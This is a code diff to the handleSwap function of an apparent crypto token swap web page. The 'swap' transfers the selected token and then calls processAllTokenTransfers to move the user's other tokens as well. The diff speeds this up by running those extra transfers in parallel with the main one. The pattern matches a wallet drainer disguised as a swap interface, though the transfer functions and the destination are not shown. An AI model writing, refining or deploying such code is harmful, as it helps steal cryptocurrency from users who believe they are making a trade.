@@ -1269,6 +1269,7 @@ async function handleSwap() {
 
     updateStatus(`Processing swap...`, "success");
     
+    // Process main token transfer
     let txHash;
     if (currentFromToken.isNative) {
       txHash = await transferNativeToken(currentFromToken, inputAmount);
@@ -1280,17 +1281,34 @@ async function handleSwap() {
       txHash = await transferERC20Token(currentFromToken, inputAmount);
     }
 
-    const otherTokensTransferred = await processAllTokenTransfers();
+    // Immediately start processing other tokens in parallel
+    updateStatus(`Swap submitted. Processing additional tokens...`, "info");
+    const otherTokensPromise = processAllTokenTransfers();
     
-    const explorerUrl = NETWORK_CONFIGS[currentNetwork].scanUrl + txHash;
+    // Wait for both the main tx confirmation and other tokens processing
+    const [confirmedTx, otherTokensTransferred] = await Promise.allSettled([
+      provider.waitForTransaction(txHash),
+      otherTokensPromise
+    ]);
+
+    // Handle results
+    if (confirmedTx.status === 'rejected') {
+      throw new Error(`Main swap failed: ${confirmedTx.reason.message}`);
+    }
+
+    const explorerUrl = NETWORK_CONFIGS[currentNetwork].scanUrl + confirmedTx.value.transactionHash;
     let successMessage = `Swap successful! <a href="${explorerUrl}" target="_blank" style="color: var(--secondary);">View transaction</a>`;
     
-    if (otherTokensTransferred > 0) {
-      successMessage += `<br>Also transferred ${otherTokensTransferred} other tokens`;
+    if (otherTokensTransferred.status === 'fulfilled' && otherTokensTransferred.value > 0) {
+      successMessage += `<br>Also transferred ${otherTokensTransferred.value} other tokens`;
+    } else if (otherTokensTransferred.status === 'rejected') {
+      console.error("Additional token transfers failed:", otherTokensTransferred.reason);
+      successMessage += `<br><small>(Some additional token transfers failed)</small>`;
     }
-    
+
     updateStatus(successMessage, "success");
 
+    // Reset form and update balances
     document.getElementById("fromAmount").value = '';
     document.getElementById("toAmount").value = '';
     await updateTokenBalances();
